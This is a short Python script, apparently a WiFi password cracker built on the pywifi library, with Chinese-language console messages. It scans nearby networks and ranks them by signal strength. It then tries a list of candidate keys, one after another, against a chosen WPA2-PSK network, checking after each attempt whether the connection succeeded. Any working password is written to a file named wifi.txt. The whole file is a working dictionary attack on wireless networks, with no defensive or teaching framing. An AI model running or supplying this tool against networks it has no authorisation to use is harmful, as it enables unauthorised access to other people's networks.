import pywifi
from pywifi import *
import time


class WifiHelper:
    def __init__(self, wait_time):
        self.wait_time = wait_time
        self.wifi = pywifi.PyWiFi()
        self.interfaces = self.wifi.interfaces()
        self.interface = self.interfaces[0]
        self.status = self.interface.status()
        scan_results = self.interface.scan_results()
        ssid_list = []
        for result in scan_results:
            ssid_list.append((result.ssid, result.signal))
        self.ssid_list = sorted(ssid_list, key=lambda r: r[1], reverse=True)

    def print_wifi_info(self):
        print("网卡状态", self.status)
        print("序号  wifi名字  信号值")
        index = 0
        for ssid in self.ssid_list:
            print(index, "  ", ssid[0], "  ", ssid[1])
            index += 1

    def get_ssid_by_index(self, index):
        return self.ssid_list[index][0]

    def run_keys(self, ssid_index, keys):
        ssid = self.ssid_list[ssid_index][0]
        for key in keys:
            print(key)
            if self.connect(ssid, key):
                return True
        return False

    def connect(self, ssid, key):
        pf = pywifi.Profile()
        pf.ssid = ssid
        pf.auth = const.AUTH_ALG_OPEN
        pf.akm.append(const.AKM_TYPE_WPA2PSK)
        pf.cipher = const.CIPHER_TYPE_CCMP
        pf.key = key
        self.interface.remove_all_network_profiles()
        tmp_profile = self.interface.add_network_profile(pf)
        self.interface.connect(tmp_profile)
        time.sleep(self.wait_time)
        if self.interface.status() == const.IFACE_CONNECTED:
            self.save_file(ssid, key)
            print("密码 ", key, " 已保存到wifi.txt")
            return True
        self.interface.disconnect()
        return False

    @staticmethod
    def save_file(ssid, pw):
        file = open("wifi.txt", "a+")
        file.write("\nssid:")
        file.write(ssid)
        file.write("\n密码:")
        file.write(pw)
